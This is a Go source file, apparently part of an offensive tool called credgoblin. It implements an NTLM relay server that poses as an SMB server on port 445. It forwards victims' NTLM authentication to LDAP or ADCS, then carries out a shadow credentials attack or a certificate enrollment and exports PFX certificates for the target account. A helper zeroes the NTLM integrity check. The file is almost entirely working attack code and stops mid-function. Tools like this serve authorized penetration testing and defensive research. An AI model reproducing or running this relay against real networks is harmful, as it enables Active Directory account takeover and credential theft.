package relay

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"time"

	"github.com/ineffectivecoder/credgoblin/pkg/ntlm"
	"github.com/ineffectivecoder/credgoblin/pkg/output"
	"github.com/ineffectivecoder/credgoblin/pkg/shadowcreds"
	"github.com/ineffectivecoder/credgoblin/pkg/smb"
)

// Config holds relay configuration
type Config struct {
	ListenAddr   string
	TargetURL    string
	TargetUser   string
	OutputPath   string
	PFXPassword  string
	Verbose      bool
	RelayMode    string // "ldap" or "adcs"
	TemplateName string // Certificate template name for ADCS
}

// Server represents the relay server
type Server struct {
	config    *Config
	logger    *output.Logger
	listener  net.Listener
	onSuccess func(pfxPath string)
}

// NewServer creates a new relay server
func NewServer(config *Config, logger *output.Logger) *Server {
	return &Server{
		config: config,
		logger: logger,
	}
}

// Start starts the relay server
func (s *Server) Start(ctx context.Context) error {
	addr := s.config.ListenAddr
	if addr == "" {
		addr = "0.0.0.0"
	}

	// Listen on port 445 for SMB
	fullAddr := fmt.Sprintf("%s:445", addr)

	listener, err := net.Listen("tcp", fullAddr)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %w", fullAddr, err)
	}

	s.listener = listener
	s.logger.Info(fmt.Sprintf("Relay server listening on %s", fullAddr))
	s.logger.Info(fmt.Sprintf("Target: %s", s.config.TargetURL))
	s.logger.Info(fmt.Sprintf("Target user: %s", s.config.TargetUser))

	go s.acceptLoop(ctx)

	return nil
}

// Stop stops the relay server
func (s *Server) Stop() error {
	if s.listener != nil {
		return s.listener.Close()
	}
	return nil
}

// OnSuccess sets a callback for when relay succeeds
func (s *Server) OnSuccess(callback func(pfxPath string)) {
	s.onSuccess = callback
}

// acceptLoop accepts incoming connections
func (s *Server) acceptLoop(ctx context.Context) {
	for {
		conn, err := s.listener.Accept()
		if err != nil {
			select {
			case <-ctx.Done():
				return
			default:
				s.logger.Error(fmt.Sprintf("Accept error: %v", err))
				continue
			}
		}

		go s.handleConnection(ctx, conn)
	}
}

// handleConnection handles a single connection
func (s *Server) handleConnection(ctx context.Context, conn net.Conn) {
	defer conn.Close()

	remoteAddr := conn.RemoteAddr().String()
	s.logger.Info(fmt.Sprintf("New connection from %s", remoteAddr))

	if s.config.RelayMode == "adcs" {
		// ADCS relay mode
		adcsClient := NewADCSClient(s.config.TargetURL, s.config.TemplateName, s.logger)

		handler := &ADCSRelayHandler{
			conn:       conn,
			adcsClient: adcsClient,
			outputPath: s.config.OutputPath,
			pfxPass:    s.config.PFXPassword,
			logger:     s.logger,
			onSuccess:  s.onSuccess,
		}

		if err := handler.Handle(ctx); err != nil {
			s.logger.Debug(fmt.Sprintf("ADCS relay error from %s: %v", remoteAddr, err))
		}
	} else {
		// LDAP relay mode (default)
		ldapClient := NewLDAPClient(s.config.TargetURL, s.logger)

		handler := &RelayHandler{
			conn:       conn,
			ldapClient: ldapClient,
			targetUser: s.config.TargetUser,
			outputPath: s.config.OutputPath,
			pfxPass:    s.config.PFXPassword,
			logger:     s.logger,
			onSuccess:  s.onSuccess,
		}

		if err := handler.Handle(ctx); err != nil {
			s.logger.Debug(fmt.Sprintf("Relay error from %s: %v", remoteAddr, err))
		}
	}
}

// RelayHandler handles NTLM relay for a single connection
type RelayHandler struct {
	conn       net.Conn
	ldapClient *LDAPClient
	targetUser string
	outputPath string
	pfxPass    string
	logger     *output.Logger
	onSuccess  func(pfxPath string)
}

// Handle performs the relay
func (h *RelayHandler) Handle(ctx context.Context) error {
	// Create a done channel for context cancellation
	done := make(chan struct{})
	defer close(done)
	go func() {
		select {
		case <-ctx.Done():
			h.conn.Close()
		case <-done:
		}
	}()

	// Connect to LDAP
	if err := h.ldapClient.Connect(); err != nil {
		return fmt.Errorf("failed to connect to LDAP: %w", err)
	}
	defer h.ldapClient.Close()

	// Process SMB packets
	for {
		// Read NetBIOS header
		netbiosHeader := make([]byte, 4)
		_, err := io.ReadFull(h.conn, netbiosHeader)
		if err != nil {
			if err == io.EOF {
				return nil
			}
			return fmt.Errorf("failed to read NetBIOS header: %w", err)
		}

		length := int(netbiosHeader[1])<<16 | int(netbiosHeader[2])<<8 | int(netbiosHeader[3])

		// Read SMB packet
		packet := make([]byte, length)
		_, err = io.ReadFull(h.conn, packet)
		if err != nil {
			return fmt.Errorf("failed to read SMB packet: %w", err)
		}

		// Process packet
		response, success, err := h.processPacket(packet)
		if err != nil {
			h.logger.Debug(fmt.Sprintf("Error processing packet: %v", err))
			return err
		}

		// Send response
		if response != nil {
			// Debug: log response hex
			if len(response) < 200 {
				h.logger.Debug(fmt.Sprintf("Sending response (%d bytes): %x", len(response), response))
			}
			if err := h.sendResponse(response); err != nil {
				return fmt.Errorf("failed to send response: %w", err)
			}
		}

		// If relay succeeded, perform shadow credentials attack
		if success {
			h.logger.Success("NTLM relay successful!")
			return h.performShadowCredentials()
		}
	}
}

// processPacket processes an SMB packet and relays NTLM
func (h *RelayHandler) processPacket(packet []byte) ([]byte, bool, error) {
	if len(packet) < 4 {
		return nil, false, fmt.Errorf("packet too short")
	}

	// Check if SMB1 or SMB2
	if packet[0] == 0xFF && packet[1] == 'S' && packet[2] == 'M' && packet[3] == 'B' {
		return h.processSMB1Packet(packet)
	} else if packet[0] == 0xFE && packet[1] == 'S' && packet[2] == 'M' && packet[3] == 'B' {
		return h.processSMB2Packet(packet)
	}

	return nil, false, fmt.Errorf("unknown protocol")
}

// processSMB2Packet processes an SMB2 packet
func (h *RelayHandler) processSMB2Packet(packet []byte) ([]byte, bool, error) {
	header, err := smb.ParseSMB2Header(packet)
	if err != nil {
		return nil, false, err
	}

	switch header.Command {
	case smb.SMB2_NEGOTIATE:
		h.logger.Debug("Received SMB2_NEGOTIATE")
		// Send negotiate response with same parameters as SMB1→SMB2 transition
		response := h.buildSMB2NegotiateResponse(header)
		return response, false, nil

	case smb.SMB2_SESSION_SETUP:
		h.logger.Debug("Received SMB2_SESSION_SETUP")
		return h.handleSessionSetupRelay(packet)

	default:
		h.logger.Debug(fmt.Sprintf("Unsupported SMB2 command: 0x%04x", header.Command))
		return nil, false, fmt.Errorf("unsupported SMB2 command: 0x%04x", header.Command)
	}
}

// processSMB1Packet processes an SMB1 packet
func (h *RelayHandler) processSMB1Packet(packet []byte) ([]byte, bool, error) {
	// Check if this is a NEGOTIATE request
	if len(packet) >= 5 && packet[4] == 0x72 { // SMB_COM_NEGOTIATE
		// Parse dialects from SMB1 NEGOTIATE
		dialects, err := h.parseSMB1Dialects(packet)
		if err != nil {
			return nil, false, fmt.Errorf("failed to parse SMB1 dialects: %w", err)
		}

		h.logger.Debug(fmt.Sprintf("Client dialects: %v", dialects))

		// Check if any SMB2 dialect is advertised
		for _, dialect := range dialects {
			if len(dialect) >= 5 && dialect[:5] == "SMB 2" {
				// Client supports SMB2, send SMB2 negotiate response (Responder-style)
				h.logger.Debug(fmt.Sprintf("Client advertised SMB2 (%s), responding with SMB2 NEGOTIATE", dialect))
				response := h.buildSMB2NegotiateFromSMB1(packet)
				return response, false, nil
			}
		}

		// No SMB2 support, reject
		h.logger.Debug("Client doesn't support SMB2, rejecting")
		header, _ := smb.ParseSMB1Header(packet)
		response := smb.BuildSMB1NegotiateResponse(header, 0xFFFF)
		return response, false, nil
	}

	// Other SMB1 commands not supported
	h.logger.Debug("Received unsupported SMB1 command")
	return nil, false, fmt.Errorf("unsupported SMB1 command")
}

// buildSMB2NegotiateFromSMB1 builds an SMB2 NEGOTIATE response from SMB1 request
func (h *RelayHandler) buildSMB2NegotiateFromSMB1(smb1Packet []byte) []byte {
	// Parse SMB1 header to get MID
	smb1Header, _ := smb.ParseSMB1Header(smb1Packet)

	// Build SMB2 NEGOTIATE response with SPNEGO
	response := make([]byte, 128)
	offset := 0

	// SMB2 Header
	copy(response[offset:offset+4], []byte{0xFE, 'S', 'M', 'B'})
	offset += 4
	binary.LittleEndian.PutUint16(response[offset:offset+2], 64) // StructureSize
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0) // CreditCharge
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0) // Status
	offset += 4
	binary.LittleEndian.PutUint16(response[offset:offset+2], smb.SMB2_NEGOTIATE) // Command
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 1) // Credit
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0x00000001) // Flags (SERVER_TO_REDIR)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0) // NextCommand
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(smb1Header.MID)) // MessageID from SMB1 MID
	offset += 8
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0) // Reserved
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0) // TreeID
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], 0) // SessionID
	offset += 8
	offset += 16 // Signature

	// Negotiate Response Body
	binary.LittleEndian.PutUint16(response[offset:offset+2], 65) // StructureSize
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], smb.SMB2_NEGOTIATE_SIGNING_ENABLED|smb.SMB2_NEGOTIATE_SIGNING_REQUIRED) // SecurityMode
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0x0202) // DialectRevision (SMB 2.002)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0) // Reserved
	offset += 2
	guid := []byte{0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF}
	copy(response[offset:offset+16], guid) // ServerGuid
	offset += 16
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0x00000001) // Capabilities
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536) // MaxTransactSize
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536) // MaxReadSize
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536) // MaxWriteSize
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(time.Now().Unix()+11644473600)*10000000) // SystemTime
	offset += 8
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(time.Now().Unix()+11644473600)*10000000) // ServerStartTime
	offset += 8

	// SPNEGO security blob
	securityBlob := []byte{
		0x60, 0x48, 0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02, 0xa0, 0x3e,
		0x30, 0x3c, 0xa0, 0x0e, 0x30, 0x0c, 0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04,
		0x01, 0x82, 0x37, 0x02, 0x02, 0x0a, 0xa3, 0x2a, 0x30, 0x28, 0xa0, 0x26,
		0x1b, 0x24, 0x6e, 0x6f, 0x74, 0x5f, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65,
		0x64, 0x5f, 0x69, 0x6e, 0x5f, 0x52, 0x46, 0x43, 0x34, 0x31, 0x37, 0x38,
		0x40, 0x70, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x5f, 0x69, 0x67, 0x6e, 0x6f,
		0x72, 0x65,
	}

	binary.LittleEndian.PutUint16(response[offset:offset+2], uint16(128)) // SecurityBufferOffset
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], uint16(len(securityBlob))) // SecurityBufferLength
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0) // Reserved2

	// Append security blob
	response = append(response[:128], securityBlob...)

	return response
}

// buildSMB2NegotiateResponse builds an SMB2 NEGOTIATE response for direct SMB2 requests
func (h *RelayHandler) buildSMB2NegotiateResponse(header *smb.SMB2Header) []byte {
	// Build SMB2 NEGOTIATE response with SPNEGO
	response := make([]byte, 128)
	offset := 0

	// SMB2 Header
	copy(response[offset:offset+4], []byte{0xFE, 'S', 'M', 'B'})
	offset += 4
	binary.LittleEndian.PutUint16(response[offset:offset+2], 64) // StructureSize
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0) // CreditCharge
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0) // Status
	offset += 4
	binary.LittleEndian.PutUint16(response[offset:offset+2], smb.SMB2_NEGOTIATE) // Command
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 1) // Credit
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0x00000001) // Flags (SERVER_TO_REDIR)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0) // NextCommand
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], header.MessageID) // MessageID from request
	offset += 8
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0) // Reserved
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0) // TreeID
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], 0) // SessionID
	offset += 8
	offset += 16 // Signature

	// Negotiate Response Body
	binary.LittleEndian.PutUint16(response[offset:offset+2], 65) // StructureSize
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], smb.SMB2_NEGOTIATE_SIGNING_ENABLED|smb.SMB2_NEGOTIATE_SIGNING_REQUIRED) // SecurityMode
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0x0202) // DialectRevision (SMB 2.002)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0) // Reserved
	offset += 2
	guid := []byte{0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF}
	copy(response[offset:offset+16], guid) // ServerGuid
	offset += 16
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0x00000001) // Capabilities
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536) // MaxTransactSize
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536) // MaxReadSize
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536) // MaxWriteSize
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(time.Now().Unix()+11644473600)*10000000) // SystemTime
	offset += 8
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(time.Now().Unix()+11644473600)*10000000) // ServerStartTime
	offset += 8

	// SPNEGO security blob
	securityBlob := []byte{
		0x60, 0x48, 0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02, 0xa0, 0x3e,
		0x30, 0x3c, 0xa0, 0x0e, 0x30, 0x0c, 0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04,
		0x01, 0x82, 0x37, 0x02, 0x02, 0x0a, 0xa3, 0x2a, 0x30, 0x28, 0xa0, 0x26,
		0x1b, 0x24, 0x6e, 0x6f, 0x74, 0x5f, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65,
		0x64, 0x5f, 0x69, 0x6e, 0x5f, 0x52, 0x46, 0x43, 0x34, 0x31, 0x37, 0x38,
		0x40, 0x70, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x5f, 0x69, 0x67, 0x6e, 0x6f,
		0x72, 0x65,
	}

	binary.LittleEndian.PutUint16(response[offset:offset+2], uint16(128)) // SecurityBufferOffset
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], uint16(len(securityBlob))) // SecurityBufferLength
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0) // Reserved2

	// Append security blob
	response = append(response[:128], securityBlob...)

	return response
}

// parseSMB1Dialects parses dialect strings from SMB1 NEGOTIATE
func (h *RelayHandler) parseSMB1Dialects(packet []byte) ([]string, error) {
	if len(packet) < 35 {
		return nil, fmt.Errorf("packet too short")
	}

	// SMB1 NEGOTIATE structure:
	// 0-31: SMB header
	// 32: WordCount (should be 0 for NEGOTIATE request)
	// 33-34: ByteCount
	// 35+: Dialects (each prefixed with 0x02 and null-terminated)

	wordCount := packet[32]
	if wordCount != 0 {
		return nil, fmt.Errorf("unexpected WordCount: %d", wordCount)
	}

	byteCount := binary.LittleEndian.Uint16(packet[33:35])
	if len(packet) < 35+int(byteCount) {
		return nil, fmt.Errorf("packet too short for ByteCount")
	}

	var dialects []string
	offset := 35
	end := 35 + int(byteCount)

	for offset < end {
		// Each dialect is prefixed with 0x02
		if packet[offset] != 0x02 {
			break
		}
		offset++

		// Find null terminator
		start := offset
		for offset < end && packet[offset] != 0 {
			offset++
		}

		dialect := string(packet[start:offset])
		dialects = append(dialects, dialect)
		offset++ // Skip null terminator
	}

	return dialects, nil
}

// handleSessionSetupRelay handles SMB2 SESSION_SETUP and relays NTLM
func (h *RelayHandler) handleSessionSetupRelay(packet []byte) ([]byte, bool, error) {
	if len(packet) < 64+9 {
		return nil, false, fmt.Errorf("session setup request too short")
	}

	offset := 64 + 12 // Skip to SecurityBufferOffset field
	securityBufferOffset := binary.LittleEndian.Uint16(packet[offset : offset+2])
	securityBufferLength := binary.LittleEndian.Uint16(packet[offset+2 : offset+4])

	if int(securityBufferOffset)+int(securityBufferLength) > len(packet) {
		return nil, false, fmt.Errorf("security buffer out of bounds")
	}

	securityBlob := packet[securityBufferOffset : securityBufferOffset+securityBufferLength]

	// Unwrap SPNEGO
	ntlmMsg, err := smb.UnwrapSPNEGO(securityBlob)
	if err != nil {
		return nil, false, fmt.Errorf("failed to unwrap SPNEGO: %w", err)
	}

	if len(ntlmMsg) < 12 {
		return nil, false, fmt.Errorf("NTLM message too short")
	}

	msgType := binary.LittleEndian.Uint32(ntlmMsg[8:12])

	switch msgType {
	case ntlm.NtLmNegotiate:
		h.logger.Info("Relaying NTLM Type 1 to LDAP...")
		// Forward to LDAP
		type2, err := h.ldapClient.ForwardNegotiate(ntlmMsg)
		if err != nil {
			return nil, false, fmt.Errorf("failed to forward negotiate: %w", err)
		}

		// Wrap in SPNEGO
		spnegoBlob := smb.WrapNTLMInSPNEGO(type2, true)

		// Build SMB2 response
		header, _ := smb.ParseSMB2Header(packet)
		response := smb.BuildSessionSetupResponse(header, smb.STATUS_MORE_PROCESSING_REQUIRED, 0x1000000000001, spnegoBlob)
		return response, false, nil

	case ntlm.NtLmAuthenticate:
		h.logger.Info("Relaying NTLM Type 3 to LDAP...")

		// Forward Type 3 unmodified (like ntlmrelayx does by default)
		err := h.ldapClient.ForwardAuthenticate(ntlmMsg)
		if err != nil {
			h.logger.Error(fmt.Sprintf("LDAP authentication failed: %v", err))
			header, _ := smb.ParseSMB2Header(packet)
			response := smb.BuildSessionSetupResponse(header, smb.STATUS_LOGON_FAILURE, 0, nil)
			return response, false, err
		}

		// Authentication successful!
		header, _ := smb.ParseSMB2Header(packet)
		response := smb.BuildSessionSetupResponse(header, smb.STATUS_SUCCESS, 0x1000000000001, nil)
		return response, true, nil

	default:
		return nil, false, fmt.Errorf("unknown NTLM message type: %d", msgType)
	}
}

// sendResponse sends an SMB response with NetBIOS header
func (h *RelayHandler) sendResponse(data []byte) error {
	header := make([]byte, 4)
	header[0] = 0x00
	length := len(data)
	header[1] = byte(length >> 16)
	header[2] = byte(length >> 8)
	header[3] = byte(length)

	if _, err := h.conn.Write(header); err != nil {
		return err
	}

	if _, err := h.conn.Write(data); err != nil {
		return err
	}

	return nil
}

// performShadowCredentials performs the shadow credentials attack
func (h *RelayHandler) performShadowCredentials() error {
	h.logger.Info("Performing shadow credentials attack...")

	// Generate KeyCredential
	keyCredential, err := shadowcreds.NewKeyCredential()
	if err != nil {
		return fmt.Errorf("failed to generate key credential: %w", err)
	}

	// Build KeyCredential blob
	blob, err := keyCredential.BuildKeyCredentialBlob()
	if err != nil {
		return fmt.Errorf("failed to build key credential blob: %w", err)
	}

	// Modify LDAP
	if err := h.ldapClient.ModifyKeyCredential(h.targetUser, blob); err != nil {
		return fmt.Errorf("failed to modify key credential: %w", err)
	}

	h.logger.Success(fmt.Sprintf("Successfully added shadow credentials to %s", h.targetUser))

	// Generate certificate
	cert, err := keyCredential.GenerateCertificate(h.targetUser)
	if err != nil {
		return fmt.Errorf("failed to generate certificate: %w", err)
	}

	// Export PFX
	if err := shadowcreds.ExportPFX(keyCredential.PrivateKey(), cert, h.pfxPass, h.outputPath); err != nil {
		return fmt.Errorf("failed to export PFX: %w", err)
	}

	h.logger.Success(fmt.Sprintf("Certificate exported to: %s", h.outputPath))

	if h.onSuccess != nil {
		h.onSuccess(h.outputPath)
	}

	return nil
}

// removeMIC removes or zeros the MIC (Message Integrity Check) from NTLM Type 3
// For plain LDAP (non-TLS), we only need to remove the MIC without touching AV_PAIRS
func removeMIC(type3 []byte) []byte {
	if len(type3) < 88 {
		return type3
	}

	// Make a copy to avoid modifying original
	modified := make([]byte, len(type3))
	copy(modified, type3)

	// NTLM Type 3 structure:
	// 0x3C: Flags (4 bytes) at offset 60
	// 0x48: MIC (16 bytes) at offset 72 if MIC flag is set

	// Check flags at offset 0x3C (60)
	if len(modified) < 64 {
		return modified
	}

	flags := binary.LittleEndian.Uint32(modified[60:64])

	// Zero out MIC if present (flag 0x00000002)
	// This is sufficient for plain LDAP without TLS
	if flags&0x00000002 != 0 && len(modified) >= 88 {
		for i := 72; i < 88; i++ {
			modified[i] = 0
		}
	}

	return modified
}

// min returns the minimum of two integers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ADCSRelayHandler handles NTLM relay for ADCS certificate enrollment
type ADCSRelayHandler struct {
	conn       net.Conn
	adcsClient *ADCSClient
	outputPath string
	pfxPass    string
	logger     *output.Logger
	onSuccess  func(pfxPath string)
}

// Handle performs the ADCS relay
func (h *ADCSRelayHandler) Handle(ctx context.Context) error {
	// Create a done channel for context cancellation
	done := make(chan struct{})
	defer close(done)
	go func() {
		select {
		case <-ctx.Done():
			h.conn.Close()
		case <-done:
		}
	}()

	// Connect to ADCS
	if err := h.adcsClient.Connect(); err != nil {
		return fmt.Errorf("failed to connect to ADCS: %w", err)
	}
	defer h.adcsClient.Close()

	// Process SMB packets
	for {
		// Read NetBIOS header
		netbiosHeader := make([]byte, 4)
		_, err := io.ReadFull(h.conn, netbiosHeader)
		if err != nil {
			if err == io.EOF {
				return nil
			}
			return fmt.Errorf("failed to read NetBIOS header: %w", err)
		}

		length := int(netbiosHeader[1])<<16 | int(netbiosHeader[2])<<8 | int(netbiosHeader[3])

		// Read SMB packet
		packet := make([]byte, length)
		_, err = io.ReadFull(h.conn, packet)
		if err != nil {
			return fmt.Errorf("failed to read SMB packet: %w", err)
		}

		// Process packet
		response, success, err := h.processPacket(packet)
		if err != nil {
			h.logger.Debug(fmt.Sprintf("Error processing packet: %v", err))
			return err
		}

		// Send response
		if response != nil {
			if err := h.sendResponse(response); err != nil {
				return fmt.Errorf("failed to send response: %w", err)
			}
		}

		// If relay succeeded, perform certificate enrollment
		if success {
			h.logger.Success("NTLM relay successful!")
			return h.performCertificateEnrollment()
		}
	}
}

// processPacket processes an SMB packet and relays NTLM to ADCS
func (h *ADCSRelayHandler) processPacket(packet []byte) ([]byte, bool, error) {
	if len(packet) < 4 {
		return nil, false, fmt.Errorf("packet too short")
	}

	// Check if SMB1 or SMB2
	if packet[0] == 0xFF && packet[1] == 'S' && packet[2] == 'M' && packet[3] == 'B' {
		return h.processSMB1Packet(packet)
	} else if packet[0] == 0xFE && packet[1] == 'S' && packet[2] == 'M' && packet[3] == 'B' {
		return h.processSMB2Packet(packet)
	}

	return nil, false, fmt.Errorf("unknown protocol")
}

// processSMB2Packet processes an SMB2 packet for ADCS relay
func (h *ADCSRelayHandler) processSMB2Packet(packet []byte) ([]byte, bool, error) {
	header, err := smb.ParseSMB2Header(packet)
	if err != nil {
		return nil, false, err
	}

	switch header.Command {
	case smb.SMB2_NEGOTIATE:
		h.logger.Debug("Received SMB2_NEGOTIATE")
		response := h.buildSMB2NegotiateResponse(header)
		return response, false, nil

	case smb.SMB2_SESSION_SETUP:
		h.logger.Debug("Received SMB2_SESSION_SETUP")
		return h.handleSessionSetupRelay(packet)

	default:
		h.logger.Debug(fmt.Sprintf("Unsupported SMB2 command: 0x%04x", header.Command))
		return nil, false, fmt.Errorf("unsupported SMB2 command: 0x%04x", header.Command)
	}
}

// processSMB1Packet processes an SMB1 packet for ADCS relay
func (h *ADCSRelayHandler) processSMB1Packet(packet []byte) ([]byte, bool, error) {
	if len(packet) >= 5 && packet[4] == 0x72 { // SMB_COM_NEGOTIATE
		dialects, err := h.parseSMB1Dialects(packet)
		if err != nil {
			return nil, false, fmt.Errorf("failed to parse SMB1 dialects: %w", err)
		}

		h.logger.Debug(fmt.Sprintf("Client dialects: %v", dialects))

		for _, dialect := range dialects {
			if len(dialect) >= 5 && dialect[:5] == "SMB 2" {
				h.logger.Debug(fmt.Sprintf("Client advertised SMB2 (%s), responding with SMB2 NEGOTIATE", dialect))
				response := h.buildSMB2NegotiateFromSMB1(packet)
				return response, false, nil
			}
		}

		h.logger.Debug("Client doesn't support SMB2, rejecting")
		header, _ := smb.ParseSMB1Header(packet)
		response := smb.BuildSMB1NegotiateResponse(header, 0xFFFF)
		return response, false, nil
	}

	h.logger.Debug("Received unsupported SMB1 command")
	return nil, false, fmt.Errorf("unsupported SMB1 command")
}

// handleSessionSetupRelay handles SMB2 SESSION_SETUP and relays NTLM to ADCS
func (h *ADCSRelayHandler) handleSessionSetupRelay(packet []byte) ([]byte, bool, error) {
	if len(packet) < 64+9 {
		return nil, false, fmt.Errorf("session setup request too short")
	}

	offset := 64 + 12
	securityBufferOffset := binary.LittleEndian.Uint16(packet[offset : offset+2])
	securityBufferLength := binary.LittleEndian.Uint16(packet[offset+2 : offset+4])

	if int(securityBufferOffset)+int(securityBufferLength) > len(packet) {
		return nil, false, fmt.Errorf("security buffer out of bounds")
	}

	securityBlob := packet[securityBufferOffset : securityBufferOffset+securityBufferLength]

	// Unwrap SPNEGO
	ntlmMsg, err := smb.UnwrapSPNEGO(securityBlob)
	if err != nil {
		return nil, false, fmt.Errorf("failed to unwrap SPNEGO: %w", err)
	}

	if len(ntlmMsg) < 12 {
		return nil, false, fmt.Errorf("NTLM message too short")
	}

	msgType := binary.LittleEndian.Uint32(ntlmMsg[8:12])

	switch msgType {
	case ntlm.NtLmNegotiate:
		h.logger.Info("Relaying NTLM Type 1 to ADCS...")
		type2, err := h.adcsClient.ForwardNegotiate(ntlmMsg)
		if err != nil {
			return nil, false, fmt.Errorf("failed to forward negotiate: %w", err)
		}

		// Wrap in SPNEGO
		spnegoBlob := smb.WrapNTLMInSPNEGO(type2, true)

		header, _ := smb.ParseSMB2Header(packet)
		response := smb.BuildSessionSetupResponse(header, smb.STATUS_MORE_PROCESSING_REQUIRED, 0x1000000000001, spnegoBlob)
		return response, false, nil

	case ntlm.NtLmAuthenticate:
		h.logger.Info("Relaying NTLM Type 3 to ADCS...")

		err := h.adcsClient.ForwardAuthenticate(ntlmMsg)
		if err != nil {
			h.logger.Error(fmt.Sprintf("ADCS authentication failed: %v", err))
			header, _ := smb.ParseSMB2Header(packet)
			response := smb.BuildSessionSetupResponse(header, smb.STATUS_LOGON_FAILURE, 0, nil)
			return response, false, err
		}

		header, _ := smb.ParseSMB2Header(packet)
		response := smb.BuildSessionSetupResponse(header, smb.STATUS_SUCCESS, 0x1000000000001, nil)
		return response, true, nil

	default:
		return nil, false, fmt.Errorf("unknown NTLM message type: %d", msgType)
	}
}

// sendResponse sends an SMB response with NetBIOS header
func (h *ADCSRelayHandler) sendResponse(data []byte) error {
	header := make([]byte, 4)
	header[0] = 0x00
	length := len(data)
	header[1] = byte(length >> 16)
	header[2] = byte(length >> 8)
	header[3] = byte(length)

	if _, err := h.conn.Write(header); err != nil {
		return err
	}

	if _, err := h.conn.Write(data); err != nil {
		return err
	}

	return nil
}

// performCertificateEnrollment requests a certificate from ADCS
func (h *ADCSRelayHandler) performCertificateEnrollment() error {
	h.logger.Info("Requesting certificate from ADCS...")

	// Generate RSA key pair
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return fmt.Errorf("failed to generate RSA key: %w", err)
	}

	// Request certificate from ADCS
	cert, err := h.adcsClient.RequestCertificate(privateKey, "")
	if err != nil {
		return fmt.Errorf("failed to request certificate: %w", err)
	}

	// Export PFX
	if err := shadowcreds.ExportPFX(privateKey, cert, h.pfxPass, h.outputPath); err != nil {
		return fmt.Errorf("failed to export PFX: %w", err)
	}

	h.logger.Success(fmt.Sprintf("Certificate exported to: %s", h.outputPath))

	if h.onSuccess != nil {
		h.onSuccess(h.outputPath)
	}

	return nil
}

// buildSMB2NegotiateFromSMB1 builds an SMB2 NEGOTIATE response from SMB1 request
func (h *ADCSRelayHandler) buildSMB2NegotiateFromSMB1(smb1Packet []byte) []byte {
	smb1Header, _ := smb.ParseSMB1Header(smb1Packet)

	response := make([]byte, 128)
	offset := 0

	copy(response[offset:offset+4], []byte{0xFE, 'S', 'M', 'B'})
	offset += 4
	binary.LittleEndian.PutUint16(response[offset:offset+2], 64)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0)
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4
	binary.LittleEndian.PutUint16(response[offset:offset+2], smb.SMB2_NEGOTIATE)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 1)
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0x00000001)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(smb1Header.MID))
	offset += 8
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4
